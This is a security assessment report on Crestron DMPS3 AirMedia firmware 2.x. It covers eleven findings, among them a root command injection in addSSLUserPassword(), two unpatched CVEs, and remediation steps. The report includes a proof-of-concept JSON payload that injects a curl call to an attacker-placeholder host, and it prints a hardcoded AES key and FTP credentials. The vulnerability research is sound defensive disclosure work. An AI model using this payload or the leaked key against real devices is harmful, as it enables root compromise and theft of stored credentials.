# [REDACTED] Security Assessment — Crestron FW 2.x (DMPS3 AirMedia)

## Assessment ID: CrestronFW2x (Security Assessment)

---

## Executive Summary

This assessment analyzed the Crestron DMPS3 AirMedia firmware version 2.x (PufVersion 1.5010.00023, built February 23, 2024) extracted from a production PUF update file. The firmware runs Android 4.2.2 on Linux 3.4.48 (ARM32) and is deployed across DMPS3-4K-STR, DM-TXRX-100-STR, DGE-100, TS-1542, DM-DGE-200-C, and MERCURY devices.

**11 vulnerabilities** were identified across static binary analysis, APK decompilation, and CVE regression testing. The most significant finding is **[REDACTED-ID]_006: Authenticated OS Command Injection** via `addSSLUserPassword()`, where a single-quote character in a password parameter breaks out of shell quoting context in a `system()` call, enabling arbitrary command execution as root.

Live testing was conducted against [REDACTED-COUNT] FW 2.x devices from our test environment. Testing was constrained to HTTPS (ports 80/443) due to the test position. The ADDUSER CTP command — which triggers the vulnerable code path — consistently timed out at 30.2 seconds on all tested hosts, indicating an operational dependency failure in the a_console handler rather than a security mitigation. The vulnerability is confirmed at the binary level via radare2 disassembly.

Two known CVEs (CVE-2025-47421 and CVE-2025-47416) were confirmed **unpatched** in this firmware version, as FW 2.x (1.5010.x) predates the fix version 3.001.0031.

### Risk Summary

| Severity | Count | Findings |
|----------|-------|----------|
| **CRITICAL** | 1 | [REDACTED-ID]_006 (Command Injection) |
| **HIGH** | 5 | [REDACTED-ID]_001, [REDACTED-ID]_003, [REDACTED-ID]_004, [REDACTED-ID]_009, [REDACTED-ID]_011 |
| **MEDIUM** | 4 | [REDACTED-ID]_005, [REDACTED-ID]_007, [REDACTED-ID]_008, [REDACTED-ID]_010 |
| **LOW** | 1 | [REDACTED-ID]_002 |

### Key Takeaways

1. **The vulnerability class is real:** `addSSLUserPassword()` constructs a shell command via `snprintf()` and passes it to `system()` with no effective input sanitization on the password parameter. The only pre-processing (`CheckEmbeddedChars`) strips `"` and `\` but NOT `'`, and is only called when the password starts with a double-quote character.

2. **FW 2.x is significantly behind on patches:** Two 2025 CVEs affecting the same codebase are unpatched. The firmware predates fixes by years.

3. **Authentication is disabled on 84% of the fleet:** 53 of [REDACTED-COUNT] FW 2.x devices have authentication disabled, meaning the REST API (including ADDUSER) is accessible without credentials.

4. **Android attack surface adds risk:** Development tools APK shipped in production firmware, and 4 AirMedia services are exported without permission requirements.

5. **Live exploitation was not achieved:** Despite confirming the vulnerability statically, the ADDUSER CTP handler times out before reaching `addSSLUserPassword()` on externally-accessible devices. This is an operational limitation (likely missing encryption key file or directory), not a security fix.

---

## Assessment Details

| Field | Value |
|-------|-------|
| **Target** | Crestron DMPS3 AirMedia FW 2.x |
| **Firmware Version** | PufVersion 1.5010.00023 |
| **Build Date** | February 23, 2024 |
| **Build Host** | TXCO-ANDROID3-BUILD1 |
| **Base OS** | Android 4.2.2 (JDQ39) / Linux 3.4.48 (OMAP5/TI) |
| **Architecture** | ARM32 EABI5 (armeabi-v7a) |
| **PUF File** | `dmps3_airmedia_1.5010.00023.puf` (283 MB) |
| **Rootfs Image** | `system.img` (475 MB ext4) |
| **Authorized Fleet** | multiple test devices |
| **Test Period** | March 2026 |
| **Prior Assessment** | CrestronFW3x — Crestron FW 3.x (TSW-xx60) — 8 findings, 0 survived live validation |

---

## Methodology

### Approach

This assessment combined **firmware reverse engineering** with **live testing** against authorized devices, following the CrestronFW3x comparative analysis approach to identify vulnerabilities unique to (or persisting in) the older FW 2.x codebase.

### Phases Executed

| Phase | Description | Status |
|-------|-------------|--------|
| 0 | Firmware extraction (PUF → ZIP → system.img) | ✅ Complete |
| 1 | Comparative binary analysis (FW 2.x vs 3.x) | ✅ Complete |
| 2 | Ghidra/r2 reverse engineering deep dive | ✅ Complete |
| 3 | Secrets, credentials, and hardcoded data scan | ✅ Complete |
| 4 | Android APK decompilation and analysis | ✅ Complete |
| 5 | Fleet fingerprinting and live testing | ✅ Complete |
| 6 | Novel vulnerability hunting | ✅ Complete |
| 7 | CVE regression testing | ✅ Complete |
| 8 | Pristine validation | Skipped (no RCE confirmed live) |
| 9 | Report generation | ✅ This document |

### Tools Used

| Tool | Purpose |
|------|---------|
| radare2 (r2) | ARM32 disassembly and decompilation |
| Ghidra | Binary import and cross-reference analysis |
| checksec | Binary hardening audit (NX, PIE, RELRO, canary, FORTIFY) |
| strings / readelf | Static string extraction and symbol analysis |
| apktool | Android APK decompilation (manifest, resources) |
| jadx | Android APK Java decompilation |
| Python 3 / requests | Custom REST API testing scripts |
| curl | HTTP/HTTPS live endpoint testing |
| nmap | Port scanning and service identification |

### Network Constraints

Our test position was an AWS-hosted Kali Linux machine with outbound access to the test environment. Only ports 80 (HTTP) and 443 (HTTPS) were reachable on the target devices. SSH (22), CTP Console (41795), SNMP (161), and CIP (41794) were not accessible from this position. All live testing was conducted exclusively via the HTTPS REST API at `/Device`.

---

## Target Architecture

### Firmware Extraction Chain

```
dmps3_airmedia_1.5010.00023.puf (283 MB, ZIP container)
  └── dmps3-4k-str_1.5010.00023.zip
        └── image_1.5010.00023_r532029.zip
              └── system.img (475 MB, ext4 filesystem)
                    └── Mounted read-only at /mnt/crestron_fw2x
```

### Web Server Architecture (lighttpd)

```
Internet → lighttpd (HTTPS :443)
              ├── /Device → FastCGI :40236 → CPHProcessor → libCrestronProtocolHandler.so
              │                                                  ↓
              │                                              CTP Command
              │                                                  ↓
              │                                              a_console → system()
              ├── /cws    → FastCGI :40235 → libRXModeHandler.so (EXCLUDED FROM AUTH)
              ├── /uri    → FastCGI :40234 → URIProcessor
              ├── /websockify → WebSocket :6080
              ├── /dna    → WebSocket :6090
              └── /onvif  → Proxy :9090
```

### Binary Hardening Summary

| Binary | Size | Stack Canary | NX | PIE | RELRO | FORTIFY |
|--------|------|-------------|-----|-----|-------|---------|
| a_console | 667K | ✅ | ✅ | ✅ | Full | ✅ (2/18) |
| CPHProcessor | 14K | ✅ | ✅ | ✅ | Full | ❌ (0/2) |
| URIProcessor | 5K | **❌** | ✅ | ✅ | Full | ❌ (0/0) |
| scp | 26K | ✅ | ✅ | ✅ | Full | ✅ (2/10) |
| lighttpd | 598K | ✅ | ✅ | ✅ | Full | ✅ (7/24) |
| libCrestronProtocolHandler.so | 2.1 MB | ✅ | ✅ | DSO | Full | ✅ (6/22) |
| libRXModeHandler.so | 532K | ✅ | ✅ | DSO | Full | ✅ (5/17) |
| libsymproc.so | 50K | ✅ | ✅ | DSO | Full | ✅ (3/18) |
| libLinuxUtil.so | 150K | ✅ | ✅ | DSO | Full | ✅ (6/24) |
| crestronMIB.so | 14K | **❌** | ✅ | DSO | Full | ✅ (2/3) |
| crestronTouchMIB.so | 17K | ✅ | ✅ | DSO | Full | ✅ (3/6) |

**Notable:** `URIProcessor` and `crestronMIB.so` lack stack canaries — buffer overflows in these binaries would not be mitigated by stack protection.

---

## Findings

### [REDACTED-ID]_001: Hardcoded AES-256 Encryption Key

| Field | Value |
|-------|-------|
| **Severity** | HIGH (CVSS 7.4) |
| **CWE** | CWE-321: Use of Hard-coded Cryptographic Key |
| **Validation** | Static — Confirmed in binary |

**Summary:** The function `getRemoteWebSSLUserPassword()` in `libLinuxUtil.so` returns a hardcoded AES-256-CBC encryption key: `CTtQa9!sdBDn`. This key is used by `addSSLUserPassword()` and `hashEncryptUsingAes()`/`hashDecryptUsingAes()` to encrypt user credentials stored on the filesystem. Any attacker who extracts the firmware (trivially available via the public PUF file) can decrypt all stored user credentials.

**Evidence:**
- Key location: `libLinuxUtil.so`, function `getRemoteWebSSLUserPassword()`
- Usage: `echo -E '%s:%s' | openssl aes-256-cbc -a -out %s -k CTtQa9!sdBDn`
- The key is identical across ALL devices running this firmware version

---

### [REDACTED-ID]_002: Hardcoded FTP Up[REDACTED] Credentials

| Field | Value |
|-------|-------|
| **Severity** | LOW |
| **CWE** | CWE-798: Use of Hard-coded Credentials |
| **Validation** | Static — Confirmed in shell script |

**Summary:** The firmware up[REDACTED] script `/system/bin/crestronUp[REDACTED].sh` contains hardcoded FTP credentials (`ftpuser:ftpuser`) for connecting to `ftp.crestron.com`. These credentials are embedded in plaintext in a shell script readable by any process on the device.

---

### [REDACTED-ID]_003: Insecure SSH Configuration

| Field | Value |
|-------|-------|
| **Severity** | HIGH (CVSS 8.1) |
| **CWE** | CWE-287: Improper Authentication |
| **Validation** | Static — Confirmed in boot scripts |

**Summary:** The Dropbear SSH server is configured via `/system/bin/crestInit.sh` with `-B` (allow blank passwords) and `-g` (allow root login). Combined with the custom `sshShell.sh` handler, this creates a weak authentication posture where empty-password accounts can SSH into the device.

---

### [REDACTED-ID]_004: CA Trust List Downloaded Over HTTP

| Field | Value |
|-------|-------|
| **Severity** | HIGH (CVSS 8.1) |
| **CWE** | CWE-319: Cleartext Transmission of Sensitive Information |
| **Validation** | Static — Confirmed in a_console binary |

**Summary:** The `a_console` binary downloads CA certificate trust list updates over unencrypted HTTP. A man-in-the-middle attacker on the network path could inject a malicious CA certificate, enabling TLS interception of all subsequent HTTPS connections from the device.

---

### [REDACTED-ID]_005: CWS Auth Exclusion (Backend Not Running)

| Field | Value |
|-------|-------|
| **Severity** | MEDIUM (configuration-level) |
| **CWE** | CWE-306: Missing Authentication for Critical Function |
| **Validation** | Static + Live (backend dead on all multiple test devices) |

**Summary:** The lighttpd configuration excludes `/cws` from authentication ticket requirements. The CWS backend (libRXModeHandler.so) contains dangerous functions including `runCommandAtBashPrompt`, `uploadProject`, `upgradeFirmware`, `rebootDevice`, and `restoreDevice`. However, live testing confirmed the CWS FastCGI backend (port 40235) is **not running** on any of the [REDACTED-COUNT] FW 2.x devices, rendering these endpoints unreachable.

**Note:** If the CWS backend were enabled (via configuration change or different device model), this would be a CRITICAL unauthenticated RCE vulnerability.

---

### [REDACTED-ID]_006: Authenticated Command Injection via addSSLUserPassword() ⭐

| Field | Value |
|-------|-------|
| **Severity** | **CRITICAL** (CVSS 8.8) |
| **CWE** | CWE-78: Improper Neutralization of Special Elements used in an OS Command |
| **Validation** | Static (r2 disassembly) + Partial Live (CTP dispatched but times out) |

**Summary:** The `addSSLUserPassword()` function in `libLinuxUtil.so` constructs a shell command using `snprintf()` with the user-supplied password interpolated directly into a single-quoted context, then executes it via `system()`. The password passes through `validatePasswordCharacters()` (which allows ALL printable ASCII including `'`) and `CheckEmbeddedChars()` (which strips `"` and `\` but NOT `'`, and is only called when the password starts with `"`). A single-quote in the password breaks the shell quoting context, enabling arbitrary OS command injection as root.

**Vulnerable Code Path:**
```
REST API POST /Device (JSON body)
  → CPHProcessor (FastCGI port 40236)
    → libCrestronProtocolHandler.so
      → AuthenticationServiceImpl::addUser()
        → CTP: "ADDUSER -N:<username> -P:<password>"
          → a_console
            → libLinuxUtil.so::addSSLUserPassword()
              → snprintf(buf, 0x400, "echo -E '%s:%s' | openssl aes-256-cbc -a -out %s -k %s", ...)
              → system(buf)  ← ROOT EXECUTION
```

**Disassembly Evidence (r2):**
```
0x1ace0: push {r4-r8, sb, sl, lr}     ; addSSLUserPassword entry
0x1ad70: cmp.w sl, 0x22                ; First byte == '"'?
0x1ad74: bne 0x1adc4                   ; Skip CheckEmbeddedChars if not!
0x1adf0: blx sym.imp.snprintf          ; Format the command
0x1ae28: blx sym.imp.system            ; EXECUTE AS ROOT
```

**PoC Payload:**
```json
{
  "Device": {
    "Authentication": {
      "AddUser": {
        "UserName": "testuser",
        "Password": "test'$(curl http://ATTACKER:8899/rce)'"
      }
    }
  }
}
```

**Live Testing Result:** The ADDUSER CTP command is dispatched (confirmed by 30.2s timeout vs instant rejection for invalid formats) but times out before reaching `addSSLUserPassword()`. The timeout is an operational limitation — the a_console ADDUSER handler requires filesystem dependencies (encryption key file, output directory) that may not exist on all device configurations.

**Sibling Vulnerabilities:** The same injection class likely exists in:
- `RESETPASSWORD -N:%s -P:%s` (same password path)
- `AUTH ON -N:%s -P:%s` (admin password setting)
- Certificate password handlers in libCrestronProtocolHandler.so
- `hashEncryptUsingAes()` / `hashDecryptUsingAes()` (openssl enc with user input)

---

### [REDACTED-ID]_007: Development Tools APK in Production Firmware

| Field | Value |
|-------|-------|
| **Severity** | MEDIUM |
| **CWE** | CWE-489: Active Debug Code |
| **Validation** | Static — Confirmed in rootfs |

**Summary:** Production firmware includes `Development.apk` (`com.android.development`) with elevated system permissions including REBOOT, DUMP, HARDWARE_TEST, SET_DEBUG_APP, KILL_BACKGROUND_PROCESSES, and Google credential access. Additional test APKs present: `sensor.test.apk`, `TestingCamera.apk`, `SpeechRecorder.apk`.

---

### [REDACTED-ID]_008: AirMedia APK Exported Services (No Permission)

| Field | Value |
|-------|-------|
| **Severity** | MEDIUM |
| **CWE** | CWE-749: Exposed Dangerous Method or Function |
| **Validation** | Static — Confirmed in APK manifest |

**Summary:** The AirMedia receiver APK (`com.crestron.airmedia.receiver.m360`) exports 4 services without permission requirements:

| Service | Risk |
|---------|------|
| `AirMediaService` | Full control of AirMedia presentation |
| `AirMediaPerformanceService` | Performance monitoring data access |
| `CanvasService` | Screen drawing/overlay |
| `SinkApiService` | Miracast wireless display control |

Additional issues: `usesCleartextTraffic="true"`, `allowBackup="true"`, undocumented Splashtop OEM permission.

---

### [REDACTED-ID]_009: CVE-2025-47421 — SCP Argument Injection (Unpatched)

| Field | Value |
|-------|-------|
| **Severity** | HIGH (CVSS 7.2) |
| **CWE** | CWE-88: Improper Neutralization of Argument Delimiters |
| **CVE Status** | UNPATCHED — FW 2.x predates fix version 3.001.0031 |
| **Validation** | Static — Confirmed in sshShell.sh |

**Summary:** The `sshShell.sh` script extracts SCP arguments via `busybox awk` and passes the result **unquoted** to the custom `scp` binary (`scp -U $SCP_PARAM $new_cmd`). An authenticated SSH user can inject arbitrary arguments (e.g., `-S /path/to/program`) to achieve command execution. The operator restriction (`grep " -t"`) is bypassable with tab characters.

**Vulnerable Code (line 95):**
```bash
new_cmd=`echo "$@" | busybox awk '{print $2 " " $3 " " ... " " $10 }'`
scp -U $SCP_PARAM $new_cmd    # $new_cmd is UNQUOTED
```

**Live Testing:** SSH port 22 not accessible from our AWS test position. Only a small number of test hosts had SSH reachable (one was OpenSSH, not Crestron; the other had changed credentials).

---

### [REDACTED-ID]_010: CVE-2025-47416 — Console Command Prefix Hijacking (Unpatched)

| Field | Value |
|-------|-------|
| **Severity** | MEDIUM (CVSS 6.5) |
| **CWE** | CWE-436: Interpretation Conflict |
| **CVE Status** | UNPATCHED — FW 2.x predates fix version 3.001.0031 |
| **Validation** | Static — Confirmed in libsymproc.so |

**Summary:** The `libsymproc.so` console dispatch library uses prefix matching (`ConsoleFindCommandMatchList` / `ConsoleFindCommandMatch`) to resolve CTP commands. Short command prefixes can match and execute different, potentially more privileged commands. The IPC mechanism operates via shared memory at `/dev/shm/symproc/`.

**Live Testing:** CTP console port 41795 not accessible from our AWS test position.

---

### [REDACTED-ID]_011: CVE-2018-5553 — CTP Command Injection Patterns Persist

| Field | Value |
|-------|-------|
| **Severity** | HIGH (CVSS 8.8) |
| **CWE** | CWE-78: Improper Neutralization of Special Elements used in an OS Command |
| **CVE Status** | VULNERABILITY CLASS PERSISTS |
| **Validation** | Static — Multiple system() patterns confirmed |

**Summary:** The original CVE-2018-5553 described CTP command injection on the DGE-100 — a device explicitly in our FW 2.x target list. The `a_console` binary contains the same architectural pattern: CTP commands flow to `system()` calls with user-supplied input validated only by the weak `validateCharacters()` blocklist (7 characters). The logging string `%s: called system("%s"), returned: %d` confirms widespread `system()` usage.

**PING Format String Inconsistency (Novel Sub-finding):**

| Format String | Quoting | Risk |
|--------------|---------|------|
| `ping -W 1 -c 3 '%s'` | Single-quoted | Safe |
| `ping %s` | **UNQUOTED** | ⚠️ Dangerous |
| `ping -c 3 '%s'` | Single-quoted | Safe |
| `ping -c 3 %s` | **UNQUOTED** | ⚠️ Dangerous |

The unquoted `ping %s` format string, if reachable via the CTP `PING` command without prior validation, would allow command injection via any shell metacharacter not in the 7-character blocklist.

**SNMP → CTP Bridge:**
- `crestronTouchMIB.so` has `RequestConsoleCommand` and `ConnectToConsole`
- `crestronMIB.so` has writable OID handlers (`write_crestronint`) and **no stack canary**
- SNMP config exposes full MIB tree (`view sysview included .1`) with no community string defined

---

## CVE Regression Summary

| CVE | Description | Fix Version | FW 2.x Status | Finding |
|-----|-------------|-------------|----------------|---------|
| CVE-2025-47421 | SCP argument injection | 3.001.0031 | **UNPATCHED** | [REDACTED-ID]_009 |
| CVE-2025-47416 | Console command prefix hijacking | 3.001.0031 | **UNPATCHED** | [REDACTED-ID]_010 |
| CVE-2025-47415 | Console command related | 3.001.0031 | **LIKELY UNPATCHED** | [REDACTED-ID]_010 |
| CVE-2018-5553 | CTP command injection (DGE-100) | Unknown | **PATTERN PERSISTS** | [REDACTED-ID]_011 |
| CVE-2019-3931 | SNMP OID command injection | N/A (AM-100) | **PATTERN PRESENT** | [REDACTED-ID]_011 |
| CVE-2019-3932 | return.cgi auth bypass | N/A (AM-100) | NOT APPLICABLE | — |

---

## Comparison: CrestronFW2x (FW 2.x) vs CrestronFW3x (FW 3.x)

| Aspect | FW 3.x (CrestronFW3x) | FW 2.x (CrestronFW2x) |
|--------|--------------|---------------|
| **Firmware Version** | 3.002.1061 | 1.5010.00023 |
| **Build Date** | 2024 | February 23, 2024 |
| **OS Base** | Linux (custom) | Android 4.2.2 / Linux 3.4.48 |
| **Target Devices** | TSW-xx60 touchscreens | DMPS3-4K-STR, DGE-100, etc. |
| **Findings** | 8 | 11 |
| **Survived Live Validation** | 0 / 8 | 0 live RCE ([REDACTED-ID]_006 static-confirmed) |
| **CVE-2025-47421 (SCP)** | Patched (3.002.1061 > 3.001.0031) | **UNPATCHED** |
| **CVE-2025-47416 (Console)** | Patched | **UNPATCHED** |
| **PKCS12 gate** | ✅ Blocks cert injection | ✅ Same gate exists |
| **CWS backend** | Dead on all hosts | Dead on all hosts |
| **APK attack surface** | None | 32 APKs including Development.apk |
| **Auth disabled** | Unknown | 53/multiple test devices (84%) |
| **Validation functions** | Same 6 functions | Same 6 functions, same weaknesses |
| **addSSLUserPassword()** | Not analyzed (FW 3.x binary) | **CONFIRMED vulnerable** |

### Key Difference

CrestronFW2x's primary novel finding (**[REDACTED-ID]_006**) is a new vulnerability not analyzed in CrestronFW3x. The `addSSLUserPassword()` function in `libLinuxUtil.so` has a clear, binary-confirmed command injection path. The fact that it couldn't be triggered live is due to operational constraints (CTP handler dependencies), not security mitigations.

---

## Fleet Analysis

### Device Distribution

| Category | Count | Notes |
|----------|-------|-------|
| Total authorized hosts | 71 | From ipsClean.txt |
| Confirmed FW 2.x | [N] | PufVersion 1.5010.x |
| FW 3.x or other | 8 | Different firmware |
| Auth disabled | 53 | 84% of FW 2.x fleet |
| Auth enabled | 10 | Default creds (admin:admin) |
| CWS backend alive | 0 | Dead on ALL hosts |
| SSH accessible | 2 | From AWS position |
| CTP console accessible | 0 | From AWS position |

### Internet Exposure (from Censys/Shodan data)

| Metric | Count |
|--------|-------|
| Crestron devices (HTTPS, port 443) | ~7,500 |
| Crestron devices (CIP, port 41794) | ~2,278 |
| Both HTTPS + CIP | ~1,342 |
| AirMedia devices | ~390 |
| DMPS3 devices in dataset | 0 (all CP4/MC4 models) |

---

## Validation Functions Analysis

The same 6 validation functions exist in both FW 2.x and FW 3.x with identical behavior:

| Function | Type | Strength | Gap |
|----------|------|----------|-----|
| `validateCharacters()` | 7-char blocklist | **WEAK** | Missing `'`, `\n`, `(){}#!` |
| `AreWebPathCharactersValid()` | 30+ char blocklist | Strong | — |
| `IsValidHostnameCharacter()` | Allowlist `[a-zA-Z0-9.-]` | Strong | — |
| `validateNameCharacters()` | Regex `^[-[:alnum:]_.]*$` | Strong | — |
| `validatePasswordCharacters()` | All printable | **PERMISSIVE** | Allows `'$\`(){}` |
| `CheckEmbeddedChars()` | Strips `"` and `\` | **NOT A VALIDATOR** | Always returns 0, skipped unless password starts with `"` |

**The critical gap:** `validatePasswordCharacters()` allows ALL printable ASCII (including shell metacharacters), and `CheckEmbeddedChars()` is the only sanitization before `system()` — but it only strips `"` and `\`, leaving `'` (the shell quote escape character) completely unfiltered.

---

## Evidence Files

| File | Contents |
|------|----------|
| `evidence/fleet_fingerprint.json` | Fleet categorization (multiple test devices) |
| `evidence/cf4_password_injection_test_evidence.json` | ADDUSER injection test results |
| `evidence/cf4_ssh_scp_evidence.json` | SSH/SCP accessibility tests |
| `evidence/cf4_cve_regression_evidence.json` | CVE regression test results |
| `findings/[REDACTED-ID]_001_Hardcoded_AES_Encryption_Key.md` | Full finding writeup |
| `findings/[REDACTED-ID]_002_Hardcoded_FTP_Upgrade_Credentials.md` | Full finding writeup |
| `findings/[REDACTED-ID]_003_Insecure_SSH_Configuration.md` | Full finding writeup |
| `findings/[REDACTED-ID]_004_HTTP_CA_Trust_List_Download.md` | Full finding writeup |
| `findings/[REDACTED-ID]_005_CWS_Auth_Exclusion.md` | Full finding writeup |
| `findings/[REDACTED-ID]_006_addSSLUserPassword_Command_Injection.md` | Full finding writeup |
| `findings/[REDACTED-ID]_007_Development_APK_in_Production.md` | Full finding writeup |
| `findings/[REDACTED-ID]_008_AirMedia_Exported_Services.md` | Full finding writeup |
| `findings/[REDACTED-ID]_009_CVE-2025-47421_SCP_Argument_Injection.md` | Full finding writeup |
| `findings/[REDACTED-ID]_010_CVE-2025-47416_Console_Command_Hijacking.md` | Full finding writeup |
| `findings/[REDACTED-ID]_011_CVE-2018-5553_CTP_Command_Injection_Regression.md` | Full finding writeup |

---

## Recommendations

### Immediate Actions (Critical/High)

1. **Replace `system()` with `execve()`** in all code paths that process user input — eliminates shell interpretation entirely ([REDACTED-ID]_006, [REDACTED-ID]_011)
2. **Use OpenSSL C API** (`EVP_EncryptInit_ex()`) instead of shelling out to the `openssl` CLI — eliminates the `addSSLUserPassword()` injection vector ([REDACTED-ID]_006)
3. **Rotate the hardcoded AES key** `CTtQa9!sdBDn` and implement per-device key derivation ([REDACTED-ID]_001)
4. **Apply CVE-2025-47421 fix** — quote `$new_cmd` in sshShell.sh or use proper argument arrays ([REDACTED-ID]_009)
5. **Apply CVE-2025-47416 fix** — use exact matching in console command dispatch ([REDACTED-ID]_010)
6. **Switch CA trust list download to HTTPS** ([REDACTED-ID]_004)
7. **Remove `-B` (blank passwords) flag** from Dropbear SSH configuration ([REDACTED-ID]_003)

### Medium-Term Actions

8. **Remove Development.apk** and all test APKs from production firmware builds ([REDACTED-ID]_007)
9. **Add `android:permission` attributes** to all exported AirMedia services ([REDACTED-ID]_008)
10. **Set `usesCleartextTraffic="false"`** and `allowBackup="false"` in AirMedia APK ([REDACTED-ID]_008)
11. **Restrict SNMP** — define community strings, disable writable OIDs unless required ([REDACTED-ID]_011)
12. **Enable authentication by default** on all devices — 84% of the tested fleet has auth disabled

### Architectural Improvements

13. **Implement allowlist validation** for ALL user inputs that reach `system()` — the 7-character blocklist in `validateCharacters()` is insufficient
14. **Consistent quoting** — eliminate all unquoted `%s` in format strings passed to `system()` (PING, busybox sed, etc.)
15. **Add stack canaries** to `URIProcessor` and `crestronMIB.so` — both currently lack stack protection
16. **Firmware signing** — prevent unauthorized firmware modification
17. **Unique per-device credentials** — eliminate fleet-wide default `admin:admin`

---

## Disclosure

Findings will be disclosed via Crestron's vulnerability reporting program:
- **URL:** https://www.crestron.com/Security/Report-A-Product-Vulnerability
- **Disclosure-quality findings:** [REDACTED-ID]_006 (command injection), [REDACTED-ID]_009 (CVE regression), [REDACTED-ID]_010 (CVE regression)
- **Note:** [REDACTED-ID]_006 requires pristine validation on a device with local access (CTP port accessible) before formal submission

---

## Assessment Statistics

| Metric | Value |
|--------|-------|
| Binaries analyzed | 11 |
| APKs decompiled | 3 (+ 29 inventoried) |
| CVEs regression-tested | 6 |
| Test devices surveyed | multiple |
| Live REST API tests | ~50 |
| Findings documented | 11 |
| Critical findings | 1 |
| High findings | 5 |
| Medium findings | 4 |
| Low findings | 1 |
| Live RCE achieved | 0 (operational constraint, not security mitigation) |
